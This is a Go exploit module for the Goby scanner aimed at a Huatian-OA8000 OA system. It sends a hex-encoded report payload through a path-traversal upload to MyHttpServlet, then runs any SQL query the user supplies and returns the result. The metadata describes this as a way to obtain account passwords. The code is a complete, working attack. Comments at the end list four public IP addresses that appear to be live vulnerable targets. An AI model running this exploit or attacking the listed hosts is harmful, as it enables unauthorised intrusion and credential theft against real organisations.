package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Huatian-OA8000 MyHttpServlet reportFile Arbitrary File Upload Vulnerability",
    "Description": "<p>Huatian-OA8000 is a combination of advanced management ideas, management models, software technology and network technology, providing users with a low-cost, high-efficiency collaborative office and management platform.</p><p>There is an arbitrary file upload vulnerability in Huatian Power OA MyHttpServlet. Attackers can upload malicious raq files and execute arbitrary sql statements in the raq files to obtain sensitive information such as user account passwords.</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2023-02-13",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\"",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file upload vulnerability in Huatian Power OA MyHttpServlet. Attackers can upload malicious raq files and execute arbitrary sql statements in the raq files to obtain sensitive information such as user account passwords.</p>",
    "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.oa8000.com.\">http://www.oa8000.com.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力OA是一款将先进的管理思想、 管理模式和软件技术、网络技术相结合，为用户提供了低成本、 高效能的协同办公和管理平台。<br></p><p>华天动力OA MyHttpServlet 存在任意文件上传漏洞，攻击者可上传恶意的raq文件并执行raq文件中的任意sql语句，获取用户账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"http://www.oa8000.com\">http://www.oa8000.com</a>。<br></p>",
            "Impact": "<p>华天动力OA MyHttpServlet 存在任意文件上传漏洞，攻击者可上传恶意的raq文件并执行raq文件中的任意sql语句，获取用户账号密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Huatian-OA8000 MyHttpServlet reportFile Arbitrary File Upload Vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian-OA8000 is a combination of advanced management ideas, management models, software technology and network technology, providing users with a low-cost, high-efficiency collaborative office and management platform.<br></p><p>There is an arbitrary file upload vulnerability in Huatian Power OA MyHttpServlet. Attackers can upload malicious raq files and execute arbitrary sql statements in the raq files to obtain sensitive information such as user account passwords.<br></p>",
            "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.oa8000.com.\">http://www.oa8000.com.</a><br></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in Huatian Power OA MyHttpServlet. Attackers can upload malicious raq files and execute arbitrary sql statements in the raq files to obtain sensitive information such as user account passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-06",
    "PocId": "10803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			hexPayload, _ := hex.DecodeString("52515152000001F50000000200020000001CA5410000000100000000020000FFFFFFFF0100000006ACED000570700000001BB1421866660100000000020000FFFFFFFF00000006ACED00057070000000ACFFFFFFFFD0E150FF0000003F80000010FFFFFFFFFFFFFFFFFFFFFFFF223100FFFFFFFFFFFFFFFFFF00000000FFFFFFF84469616C6F67000CFFFFFFFFFF000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF503F400000FF000000503F400000FF000000503F400000FF000000533F400000FF0000000000001500012801000F206473312E73656C656374282331290020C0FFFFFFFF0000FFFFFFFF00000006ACED00057070FFFFFFFF00000000003B0009000100010001000000140001000100644352000043948000419800004198000041C8000041C8000001000002000002000201010000FFFFFFFEFFFFFFFFFFFFFFFF00000073000101FFFFFFD0636F6D2E72756E7169616E2E7265706F7274342E757365726D6F64656C2E53514C44617461536574436F6E6669670000003A00000017FFFFFFFB647331FFFFFFFA68746F61FFFFFFFE00010000FFFFFFF153454C454354206D6435283129FFFFFFFEFFFFFFFEFFFFFFFF00000000000200000000000A00FFFFFFFE0B0000000000000012FFFFFFFEFFFFFFFE00000F3CFFFFFFFE03010000006401FFFFFFFE00FFFFFFFEFFFFFFFFFFFFFFFE52515152525151521EF9B0ACDA8D807383F468C5C023B4EB0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
			randName := goutils.RandomHexString(6)
			uri := "/OAapp/MyHttpServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a")
			cfg.Data = fmt.Sprintf("--9b0af0d79eaea67c3aa1889b0b43a50a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\\\\Temp\\\\../../../report/reportFiles/%s.jpg\"\r\n\r\n%s\r\n--9b0af0d79eaea67c3aa1889b0b43a50a--\r\n", randName, string(hexPayload))
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "state=SUCCESS") {
				uri2 := fmt.Sprintf("/report/reportJsp/showHTReport.jsp?reportFile=%s.jpg", randName)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "c4ca4238a0b923820dcc509a6f75849b")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sql"].(string)
			hexPayload1, _ := hex.DecodeString("52515152000001F50000000200020000001CA5410000000100000000020000FFFFFFFF0100000006ACED000570700000001BB1421866660100000000020000FFFFFFFF00000006ACED00057070000000ACFFFFFFFFD0E150FF0000003F80000010FFFFFFFFFFFFFFFFFFFFFFFF223100FFFFFFFFFFFFFFFFFF00000000FFFFFFF84469616C6F67000CFFFFFFFFFF000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF503F400000FF000000503F400000FF000000503F400000FF000000533F400000FF0000000000001500012801000F206473312E73656C656374282331290020C0FFFFFFFF0000FFFFFFFF00000006ACED00057070FFFFFFFF00000000003B0009000100010001000000140001000100644352000043948000419800004198000041C8000041C8000001000002000002000201010000FFFFFFFEFFFFFFFFFFFFFFFF00000073000101FFFFFFD0636F6D2E72756E7169616E2E7265706F7274342E757365726D6F64656C2E53514C44617461536574436F6E6669670000003A00000017FFFFFFFB647331FFFFFFFA68746F61FFFFFFFE00010000FFFFFFF153454C45435420")
			hexPayload2, _ := hex.DecodeString("FFFFFFFEFFFFFFFEFFFFFFFF00000000000200000000000A00FFFFFFFE0B0000000000000012FFFFFFFEFFFFFFFE00000F3CFFFFFFFE03010000006401FFFFFFFE00FFFFFFFEFFFFFFFFFFFFFFFE52515152525151521EF9B0ACDA8D807383F468C5C023B4EB0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

			randName := goutils.RandomHexString(6)
			uri := "/OAapp/MyHttpServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a")
			cfg.Data = fmt.Sprintf("--9b0af0d79eaea67c3aa1889b0b43a50a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\\\\Temp\\\\../../../report/reportFiles/%s.jpg\"\r\n\r\n%s%s%s\r\n--9b0af0d79eaea67c3aa1889b0b43a50a--\r\n", randName, string(hexPayload1), cmd, hexPayload2)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "state=SUCCESS") {
				uri2 := fmt.Sprintf("/report/reportJsp/showHTReport.jsp?reportFile=%s.jpg", randName)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "\t<td class=\"reportFile_1\">") {
					body := regexp.MustCompile("<td class=\"reportFile_1\">(.*?)</td>").FindStringSubmatch(resp2.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}

//http://218.30.21.107:8000
//http://218.75.190.169:81
//http://211.160.76.142:8088
//http://61.146.48.102:8088